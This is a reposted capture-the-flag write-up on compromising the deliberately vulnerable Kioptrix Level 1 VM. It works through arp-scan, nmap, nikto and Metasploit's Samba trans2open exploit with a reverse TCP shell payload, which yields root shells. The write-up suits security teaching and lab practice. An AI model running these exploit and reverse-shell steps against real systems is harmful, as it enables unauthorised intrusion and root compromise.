# :game_die: Solving Kioptrix Level 1 Capture the Flag (CTF)

> **Original Source:** [Solving Kioptrix Level 1 Capture the Flag (CTF)](https://infosecwriteups.com/solving-kioptrix-level-1-capture-the-flag-ctf-5d8da2fb2ea5)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Solving Kioptrix Level 1 Capture the Flag (CTF)


*Created by DALL-E*

## Introduction


In this article, we will walk through the process of solving the Kioptrix Level 1 CTF challenge. Gaining root access to the target system by all means possible is the aim of the game. We’ll take the task step by step, breaking down each component into manageable chunks.

## Scanning the Local Host


The first step is to perform an ARP scan of the local host. This scan helps us discover other devices on the network and their IP addresses. By running the command `arp-scan -l`, we can see the results of the scan.


```
# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:86:7f:c6, IPv4: 10.0.2.15
Starting arp-scan 1.10.0 with 256 hosts (<https://github.com/royhills/arp-scan>)
10.0.2.1 52:54:00:12:35:00 QEMU
10.0.2.2 52:54:00:12:35:00 QEMU
10.0.2.3 08:00:27:e9:aa:c5 PCS Systemtechnik GmbH
10.0.2.4 08:00:27:fe:4b:f1 PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.327 seconds (110.01 hosts/sec). 4 responded
```


## Scanning the Target IP


Next, we perform a scan on the target IP address using the Nmap tool. This scan helps us identify the open ports and services running on the target system. By running the command `nmap 10.0.2.4 -T4 -A -p-`, we can gather information about the target.


```
# nmap 10.0.2.4 -T4 -A -p-
Starting Nmap 7.94 ( <https://nmap.org> ) at 2023-07-02 09:15 +03
Nmap scan report for 10.0.2.4
Host is up (0.0049s latency).
Not shown: 65529 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:
| 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp open rpcbind 2 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2 111/tcp rpcbind
| 100000 2 111/udp rpcbind
| 100024 1 32768/tcp status
|_ 100024 1 32768/udp status
139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2023-07-02T10:16:34+00:00; +4h00m00s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after: 2010-09-26T09:32:06
| sslv2:
| SSLv2 supported
| ciphers:
| SSL2_DES_192_EDE3_CBC_WITH_MD5
| SSL2_RC4_128_WITH_MD5
| SSL2_RC4_128_EXPORT40_WITH_MD5
| SSL2_RC4_64_WITH_MD5
| SSL2_DES_64_CBC_WITH_MD5
| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_ SSL2_RC2_128_CBC_WITH_MD5
32768/tcp open status 1 (RPC #100024)
MAC Address: 08:00:27:FE:4B:F1 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop
Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 3h59m59s
|_smb2-time: Protocol negotiation failed (SMB2)
TRACEROUTE
HOP RTT ADDRESS
1 4.94 ms 10.0.2.4
OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 69.56 seconds
```


## Get Ahmet Talha Şen’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in

## Conducting Web Vulnerability Assessment


To further explore the target system, we can use the Nikto tool to perform a web vulnerability assessment. By running the commands `nikto -hhttps://10.0.2.4` and `nikto -h http://10.0.2.4`, we can identify potential vulnerabilities and misconfigurations on the web server.


```
# nikto -h <https://10.0.2.4>
- Nikto v2.5.0


+ 0 host(s) tested

# nikto -h <http://10.0.2.4>
- Nikto v2.5.0

+ Target IP: 10.0.2.4
+ Target Hostname: 10.0.2.4
+ Target Port: 80
+ Start Time: 2023-07-02 09:33:23 (GMT3)

+ Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep 6 06:12:46 2001. See: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418>
+ /: The anti-clickjacking X-Frame-Options header is not present. See: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/>
+ /: Apache is vulnerable to XSS via the Expect header. See: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918>
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: <https://owasp.org/www-community/attacks/Cross_Site_Tracing>
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835>
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: <https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/>
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time: 2023-07-02 09:34:36 (GMT3) (73 seconds)

+ 1 host(s) tested
```


## Exploiting Vulnerabilities with Metasploit


Using the Metasploit Framework, we may try to exploit the vulnerabilities based on the information acquired. We launch the Metasploit console by typing the command `msfconsole` into the terminal.


```
=[ metasploit v6.3.21-dev ]
+ -- --=[ 2327 exploits - 1218 auxiliary - 413 post ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops ]
+ -- --=[ 9 evasion ]
Metasploit tip: You can use help to view all
available commands
Metasploit Documentation: <https://docs.metasploit.com/>
msf6 > options
Global Options:
===============
Option Current Setting Description
------ --------------- -----------
ConsoleLogging false Log all console input and output
LogLevel 0 Verbosity of logs (default 0, max
3)
MeterpreterPrompt meterpreter The meterpreter prompt string
MinimumRank 0 The minimum rank of exploits that
will run without explicit confirma
tion
Prompt msf6 The prompt string
PromptChar > The prompt character
PromptTimeFormat %Y-%m-%d %H:%M:%S Format for timestamp escapes in pr
ompts
SessionLogging false Log all input and output for sessi
ons
SessionTlvLogging false Log all incoming and outgoing TLV
packets
TimestampOutput false Prefix all console output with a t
imestamp
msf6 > set rehosts 10.0.2.4
rehosts => 10.0.2.4
msf6 > run
[-] Unknown command: run
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > options
Module options (auxiliary/scanner/smb/smb_version):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOSTS yes The target host(s), see <https://docs>
.metasploit.com/docs/using-metasploi
t/basics/using-metasploit.html
THREADS 1 yes The number of concurrent threads (ma
x one per host)
View the full module info with the info, or info -d command.
msf6 auxiliary(scanner/smb/smb_version) > set RHOST 10.0.2.4
RHOST => 10.0.2.4
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 10.0.2.4:139 - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 10.0.2.4:139 - Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.0.2.4: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```


These commands load the SMB version scanner module, set the target IP address, and run the scan. The output provides information about the SMB version running on the target system.


```
msf6 auxiliary(scanner/smb/smb_version) > search trans2open

Matching Modules
================

# Name Disclosure Date Rank Check Description
- ---- --------------- ---- ----- -----------
0 exploit/freebsd/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (*BSD x86)
1 exploit/linux/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (Linux x86)
2 exploit/osx/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (Mac OS X PPC)
3 exploit/solaris/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (Solaris SPARC)

Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
msf6 auxiliary(scanner/smb/smb_version) > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

Name Current Setting Required Description
---- --------------- -------- -----------
RHOSTS yes The target host(s), see <https://docs>.
metasploit.com/docs/using-metasploit/
basics/using-metasploit.html
RPORT 139 yes The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):

Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 10.0.2.15 yes The listen address (an interface may b
e specified)
LPORT 4444 yes The listen port

Exploit target:

Id Name
-- ----
0 Samba 2.2.x - Bruteforce

View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > exploit

[-] Msf::OptionValidateError The following options failed to validate: RHOSTS
msf6 exploit(linux/samba/trans2open) > set RHOSTS 10.0.2.4
RHOSTS => 10.0.2.4
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444
[*] 10.0.2.4:139 - Trying return address 0xbffffdfc...
[*] 10.0.2.4:139 - Trying return address 0xbffffcfc...
[*] 10.0.2.4:139 - Trying return address 0xbffffbfc...
[*] 10.0.2.4:139 - Trying return address 0xbffffafc...
[*] Sending stage (36 bytes) to 10.0.2.4
[*] 10.0.2.4:139 - Trying return address 0xbffff9fc...
[*] Sending stage (36 bytes) to 10.0.2.4
[*] 10.0.2.4:139 - Trying return address 0xbffff8fc...
[*] Sending stage (36 bytes) to 10.0.2.4
[*] 10.0.2.4:139 - Trying return address 0xbffff7fc...
[*] Sending stage (36 bytes) to 10.0.2.4
[*] 10.0.2.4:139 - Trying return address 0xbffff6fc...
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.4:32793) at 2023-07-02 12:20:13 +0300

[*] Command shell session 2 opened (10.0.2.15:4444 -> 10.0.2.4:32794) at 2023-07-02 12:20:14 +0300
[*] Command shell session 3 opened (10.0.2.15:4444 -> 10.0.2.4:32795) at 2023-07-02 12:20:15 +0300
[*] Command shell session 4 opened (10.0.2.15:4444 -> 10.0.2.4:32796) at 2023-07-02 12:20:18 +0300
whoami
root
id
uid=0(root) gid=0(root) groups=99(nobody)
/bin/bash -i
bash: no job control in this shell
[root@kioptrix tmp]# history
history
1 ls
2 mail
3 mail
4 clear
5 echo "ls" > .bash_history && poweroff
6 nano /etc/issue
7 pico /etc/issue
8 pico /etc/issue
9 ls
10 clear
11 ls /home/
12 exit
13 ifconfig
14 poweroff
15 history
[root@kioptrix tmp]# mail
mail
Mail version 8.1 6/6/93. Type ? for help.
"/var/mail/root": 2 messages 1 new 2 unread
U 1 root@kioptix.level1 Sat Sep 26 11:42 15/481 "About Level 2"
>N 2 root@kioptrix.level1 Sun Jul 2 05:53 18/522 "LogWatch for kioptrix"
1
Message 1:
From root Sat Sep 26 11:42:10 2009
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...

2
Message 2:
From root Sun Jul 2 05:53:30 2023
Date: Sun, 2 Jul 2023 05:53:30 -0400
From: root <root@kioptrix.level1>
To: root@kioptrix.level1
Subject: LogWatch for kioptrix.level1

################## LogWatch 2.1.1 Begin #####################

###################### LogWatch End #########################
```

---

*Originally published on [Medium](https://infosecwriteups.com/solving-kioptrix-level-1-capture-the-flag-ctf-5d8da2fb2ea5). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
